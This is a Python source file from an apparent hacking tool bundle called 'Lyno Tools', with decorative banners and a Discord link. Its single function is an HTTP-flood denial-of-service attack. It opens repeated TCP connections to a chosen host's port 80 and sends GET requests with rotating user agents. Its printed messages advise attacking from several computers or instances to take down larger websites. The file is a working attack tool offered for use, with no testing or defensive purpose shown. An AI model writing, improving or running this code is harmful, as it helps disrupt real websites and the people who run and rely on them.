"""
     __                                       _______  _______                    
    |  \                                     |       \|       \                   
    | ▓▓      __    __ _______   ______      | ▓▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\ ______   _______ 
    | ▓▓     |  \  |  \       \ /      \     | ▓▓  | ▓▓ ▓▓  | ▓▓/      \ /       \
    | ▓▓     | ▓▓  | ▓▓ ▓▓▓▓▓▓▓\  ▓▓▓▓▓▓\    | ▓▓  | ▓▓ ▓▓  | ▓▓  ▓▓▓▓▓▓\  ▓▓▓▓▓▓▓
    | ▓▓     | ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓  | ▓▓    | ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓  | ▓▓\▓▓    \ 
    | ▓▓_____| ▓▓__/ ▓▓ ▓▓  | ▓▓ ▓▓__/ ▓▓    | ▓▓__/ ▓▓ ▓▓__/ ▓▓ ▓▓__/ ▓▓_\▓▓▓▓▓▓\
    | ▓▓     \\▓▓    ▓▓ ▓▓  | ▓▓\▓▓    ▓▓    | ▓▓    ▓▓ ▓▓    ▓▓\▓▓    ▓▓       ▓▓
    \▓▓▓▓▓▓▓▓_\▓▓▓▓▓▓▓\▓▓   \▓▓ \▓▓▓▓▓▓      \▓▓▓▓▓▓▓ \▓▓▓▓▓▓▓  \▓▓▓▓▓▓ \▓▓▓▓▓▓▓ 
            |  \__| ▓▓                                                           
            \▓▓    ▓▓                                                           
            \▓▓▓▓▓▓                                                       

                             Lyno Tools Present , All Stuffs by lyno team
                             https://dsc.gg/lyno




"""


import socket
import colorama
import os
from colorama import Fore
from pystyle import *
from random import choice
from modules.user_agents import user_agents
from modules.clear_scr import clear_scr


def dos(host):
    clear_scr()

    print(Fore.LIGHTRED_EX+"[*]This program will use HTTP FLOOD to dos the host.\n[*]It would work only on small websites if done only for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better performance open multiple instances of this software and attack at the same time.\n")
    print(Fore.GREEN+"[*]Host to attack: "+host)
    ip = socket.gethostbyname(host)
    print(Fore.RED+"[*]IP of the host: "+ip+"\n\n")
    conn = input(
        "Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average sites): ")
    conn = int(conn)
    os.system('cls')
    Write.Print(f"""
                        ██╗     ██╗   ██╗███╗   ██╗ ██████╗ 
                        ██║     ╚██╗ ██╔╝████╗  ██║██╔═══██╗
                        ██║      ╚████╔╝ ██╔██╗ ██║██║   ██║
                        ██║       ╚██╔╝  ██║╚██╗██║██║   ██║
                        ███████╗   ██║   ██║ ╚████║╚██████╔╝
                        ╚══════╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝ 
                        

            ███████╗███████╗██████╗ ██╗   ██╗██╗ ██████╗███████╗███████╗
            ██╔════╝██╔════╝██╔══██╗██║   ██║██║██╔════╝██╔════╝██╔════╝
            ███████╗█████╗  ██████╔╝██║   ██║██║██║     █████╗  ███████╗
            ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██║     ██╔══╝  ╚════██║
            ███████║███████╗██║  ██║ ╚████╔╝ ██║╚██████╗███████╗███████║
            ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝ ╚═════╝╚══════╝╚══════╝
                             https://dsc.gg/lyno
                             SRC:
                             \n\n{user_agents}
    
    """,Colors.red_to_purple,interval=0.0000)
    for i in range(conn):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            print("Unable to create Socket. Retrying.")
            continue
        try:
            s.connect((ip, 80))
        except:
            print("Unable To Connect. Retrying.")
            continue
        Write.Print(f"\n> Bot Crashing , Status : Crashed {i}",Colors.red_to_black,interval = 0.0000)
        s.send("GET / HTTP/1.1\r\n".encode())
        s.send("Host: ".encode()+host.encode()+"\r\n".encode())
        s.send("User-Agent: ".encode() +
               choice(user_agents).encode()+"\r\n\r\n".encode())
        s.close()
        Write.Print(f"\n > Attacked Successfully ! , Attacked  As http://{host}",Colors.blue_to_green,interval=0.0000)
